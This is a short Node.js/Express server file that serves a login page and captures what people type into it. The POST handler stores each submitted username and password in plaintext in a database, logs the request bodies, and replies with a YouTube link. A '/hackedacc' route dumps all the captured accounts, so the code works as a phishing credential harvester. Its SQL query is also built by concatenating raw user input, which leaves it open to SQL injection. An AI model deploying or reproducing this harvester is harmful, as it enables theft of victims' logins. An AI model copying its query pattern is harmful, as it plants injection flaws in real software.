var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');
var bodyParser = require('body-parser');

var mysql = require('mysql');
var con = mysql.createConnection({
  host     : 'localhost',
  user     : 'root',
  password : '',
  database : 'mydatabase'
});

con.connect();

// Init App
var app = express();


app.set("view engine","ejs");
app.set('views', path.join(__dirname, 'views'));

// BodyParser Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(cookieParser());

// Set Static Folder
app.use(express.static(path.join(__dirname, 'public')));

app.get('/',function (req, res) {
	res.render("login");
});
app.get('/hackedacc',function (req, res) {
	con.query("SELECT * FROM account", function (err, result, fields) {
    	if (err) throw err;
    	res.send(result);
  	});
});
app.post('/',function (req, res) {
	var username=req.body.username;
	var password=req.body.password;
	console.log(req.body);
	con.query("INSERT INTO account (username, password) VALUES ('"+username+"', '"+password+"')", function (err, result) {
		res.send("https://www.youtube.com/watch?v=8lMMDot32vU");
  	});
});


// Set Port
app.set('port', (process.env.PORT || 3000));

app.listen(app.get('port'), function(){
	console.log('Server started on port '+app.get('port'));
});
